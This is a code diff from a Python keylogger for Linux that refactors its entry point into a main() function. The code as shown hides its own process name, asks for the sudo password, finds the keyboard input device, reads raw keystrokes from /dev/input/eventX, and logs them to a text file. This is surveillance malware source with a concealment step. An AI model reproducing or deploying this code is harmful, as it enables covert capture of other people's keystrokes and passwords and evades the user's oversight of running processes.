@@ -345,31 +345,42 @@ def __perform_keylog(event_x: str,
     except IOError as e:
         sys.exit(f"[+] ERROR: An error has occurred while reading the event file: {e}")
 
+    except SystemExit:
+        print("[+] Error: A SystemExit exception has occurred!")
+        return buffer
+
     except KeyboardInterrupt:
         print("[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called!")
         return buffer
 
 
-if __name__ == '__main__':
-    # Check setproctitle dependency on host machine
-    __check_dependencies()
+def main():
+    try:
+        # Print Keylog Title
+        print("===================================== || KEYLOGGER PROGRAM || =====================================")
 
-    # Obscure process name
-    __hide_process_name()
+        # Check setproctitle dependency on host machine
+        __check_dependencies()
 
-    # Initialize Variables
-    signal_stop = False
-    sudo_password = getpass.getpass("[+] Enter your sudo password: ")  # Get the sudo password from the user
-    command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
+        # Obscure process name
+        __hide_process_name()
 
-# a) Use subprocess to run the sudo command
-    event = __get_kb_event(sudo_password, command)
+        # Initialize Variables
+        signal_stop = False
+        sudo_password = getpass.getpass("[+] Enter your sudo password: ")  # Get the sudo password from the user
+        command = "sudo -S cat /proc/bus/input/devices | grep \"Handlers=sysrq kbd\""
 
-# b) Perform keylogger by opening the "/dev/input/eventX" file in the read-binary mode
-    keylog_buffer = __perform_keylog(event, signal_stop)
+        # a) Use subprocess to run the sudo command
+        event = __get_kb_event(sudo_password, command)
 
-# c) Get date and host information (for appending to .txt file name)
-    file_name = __create_file_name()
+        # b) Perform keylogger by opening the "/dev/input/eventX" file in the read-binary mode
+        keylog_buffer = __perform_keylog(event, signal_stop)
 
-# d) Create a new .txt file to record and log keystrokes (with rwx permissions)
-    __create_write_to_keylog_file(file_name, keylog_buffer)
+        # c) Get date and host information (for appending to .txt file name)
+        file_name = __create_file_name()
+
+        # d) Create a new .txt file to record and log keystrokes (with rwx permissions)
+        __create_write_to_keylog_file(file_name, keylog_buffer)
+
+    except KeyboardInterrupt as e:
+        print("[+] KEYLOGGER STOPPED: A KeyboardInterrupt was called (program now terminating...)")
